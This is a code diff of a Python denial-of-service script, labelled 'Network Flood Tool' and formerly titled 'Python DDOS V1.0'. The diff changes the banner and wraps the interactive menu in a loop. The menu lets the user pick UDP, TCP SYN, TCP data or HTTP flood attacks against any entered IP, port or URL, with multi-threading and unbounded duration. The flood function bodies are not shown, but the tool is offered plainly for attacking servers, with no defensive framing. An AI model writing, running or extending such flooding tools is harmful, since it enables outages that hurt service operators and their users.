@@ -5,6 +5,7 @@ import threading
 import requests
 from colorama import init, Fore
 import os
+
 def clear_console():
     if os.name == 'nt':
         os.system('cls')
@@ -12,24 +13,19 @@ def clear_console():
         os.system('clear')
 clear_console()
 
-
 # Initialize Colorama for colored output
 init(autoreset=True)
 
-# Set the window title
-print(f"\033]0;Python DDOS V1.0 By Beat\007", end="", flush=True)
-
 # ASCII Art
-ascii_art = """
-|\\   ___ \\|\\   ___ \\|\\   __  \\|\\   ____\\     
-\\ \\  \\_|\\ \\ \\  \\_|\\ \\ \\  \\|\\  \\ \\  \\___|_    
- \\ \\  \\ \\\\ \\ \\  \\ \\\\ \\ \\  \\\\\\  \\ \\_____  \\   
-  \\ \\  \\_\\\\ \\ \\  \\_\\\\ \\ \\  \\\\\\  \\|____|\\  \\  
-   \\ \\_______\\ \\_______\\ \\_______\\____\\_\\  \\ 
-    \\|_______|\\|_______|\\|_______|\\_________\\
-                                 \\|_________|
-"""
+ascii_art = """ ________  ________  ________  ________      
+|\   ___ \|\   ___ \|\   __  \|\   ____\     
+\ \  \_|\ \ \  \_|\ \ \  \|\  \ \  \___|_    
+ \ \  \ \\ \ \  \ \\ \ \  \\\  \ \_____  \   
+  \ \  \_\\ \ \  \_\\ \ \  \\\  \|____|\  \  
+   \ \_______\ \_______\ \_______\____\_\  \ 
+    \|_______|\|_______|\|_______|\_________\
 
+"""
 
 print(Fore.RED + ascii_art)
 
@@ -182,74 +178,80 @@ def validate_input(prompt, min_val, max_val, input_type=int):
             print(Fore.RED + "[!] Invalid input. Please enter a number.")
 
 def main():
-    # Print header when tool runs
-    print(Fore.RED + "       Made by beat")
-    print(Fore.RED + "=== Network Flood Tool ===")
-    print("Protocols:")
-    print("1. UDP")
-    print("2. TCP")
-    print("3. HTTP")
+    while True:
+        # Print header when tool runs
+        print(Fore.RED + "       Made by beat")
+        print(Fore.RED + "=== Network Flood Tool ===")
+        print("Protocols:")
+        print("1. UDP")
+        print("2. TCP")
+        print("3. HTTP")
+        print("q. Quit")
 
-    protocol = input(Fore.WHITE + "Select protocol (1-3): ").strip()
+        choice = input(Fore.WHITE + "Select protocol (1-3) or type 'q' to quit: ").strip()
 
-    if protocol == "1":  # UDP
-        print(Fore.WHITE + "\nUDP Methods:")
-        print("1. UDP Plain (Fixed payload)")
-        print("2. UDP Random (Random payload)")
-        method = input(Fore.WHITE + "Select method (1-2): ").strip()
+        if choice == "q":
+            print(Fore.WHITE + "Exiting...")
+            break
 
-        ip = input(Fore.WHITE + "Enter server IP: ")
-        port = validate_input("Enter port (1-65535): ", 1, 65535)
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-        packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
+        if choice == "1":  # UDP
+            print(Fore.WHITE + "\nUDP Methods:")
+            print("1. UDP Plain (Fixed payload)")
+            print("2. UDP Random (Random payload)")
+            method = input(Fore.WHITE + "Select method (1-2): ").strip()
 
-        if method == "1":
-            udp_plain_flood(ip, port, duration, packet_size)
-        elif method == "2":
-            udp_random_flood(ip, port, duration, packet_size)
-        else:
-            print(Fore.RED + "[!] Invalid UDP method.")
-
-    elif protocol == "2":  # TCP
-        print(Fore.WHITE + "\nTCP Methods:")
-        print("1. TCP SYN Flood (Sends SYN packets)")
-        print("2. TCP Data Flood (Sends data after connection)")
-        method = input(Fore.WHITE + "Select method (1-2): ").strip()
-
-        ip = input(Fore.WHITE + "Enter server IP: ")
-        port = validate_input("Enter port (1-65535): ", 1, 65535)
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-
-        print(Fore.WHITE + "Execution Style:")
-        print("1. Single (One socket)")
-        print("2. Multi-threaded (10 threads)")
-        style = input(Fore.WHITE + "Select style (1-2): ").strip()
-
-        if method == "1":
-            if style == "1":
-                tcp_syn_flood_single(ip, port, duration)
-            elif style == "2":
-                tcp_syn_flood_multi(ip, port, duration)
-            else:
-                print(Fore.RED + "[!] Invalid TCP SYN style.")
-        elif method == "2":
+            ip = input(Fore.WHITE + "Enter server IP: ")
+            port = validate_input("Enter port (1-65535): ", 1, 65535)
+            duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
             packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
-            if style == "1":
-                tcp_data_flood_single(ip, port, duration, packet_size)
-            elif style == "2":
-                tcp_data_flood_multi(ip, port, duration, packet_size)
+
+            if method == "1":
+                udp_plain_flood(ip, port, duration, packet_size)
+            elif method == "2":
+                udp_random_flood(ip, port, duration, packet_size)
             else:
-                print(Fore.RED + "[!] Invalid TCP Data style.")
+                print(Fore.RED + "[!] Invalid UDP method.")
+
+        elif choice == "2":  # TCP
+            print(Fore.WHITE + "\nTCP Methods:")
+            print("1. TCP SYN Flood (Sends SYN packets)")
+            print("2. TCP Data Flood (Sends data after connection)")
+            method = input(Fore.WHITE + "Select method (1-2): ").strip()
+
+            ip = input(Fore.WHITE + "Enter server IP: ")
+            port = validate_input("Enter port (1-65535): ", 1, 65535)
+            duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
+
+            print(Fore.WHITE + "Execution Style:")
+            print("1. Single (One socket)")
+            print("2. Multi-threaded (10 threads)")
+            style = input(Fore.WHITE + "Select style (1-2): ").strip()
+
+            if method == "1":
+                if style == "1":
+                    tcp_syn_flood_single(ip, port, duration)
+                elif style == "2":
+                    tcp_syn_flood_multi(ip, port, duration)
+                else:
+                    print(Fore.RED + "[!] Invalid TCP SYN style.")
+            elif method == "2":
+                packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
+                if style == "1":
+                    tcp_data_flood_single(ip, port, duration, packet_size)
+                elif style == "2":
+                    tcp_data_flood_multi(ip, port, duration, packet_size)
+                else:
+                    print(Fore.RED + "[!] Invalid TCP Data style.")
+            else:
+                print(Fore.RED + "[!] Invalid TCP method.")
+
+        elif choice == "3":  # HTTP
+            url = input(Fore.WHITE + "Enter URL (e.g., http://example.com): ")
+            duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
+            http_flood(url, duration)
+
         else:
-            print(Fore.RED + "[!] Invalid TCP method.")
-
-    elif protocol == "3":  # HTTP
-        url = input(Fore.WHITE + "Enter URL (e.g., http://example.com): ")
-        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
-        http_flood(url, duration)
-
-    else:
-        print(Fore.RED + "[!] Invalid protocol selected.")
+            print(Fore.RED + "[!] Invalid protocol selected.")
 
 if __name__ == "__main__":
     main()
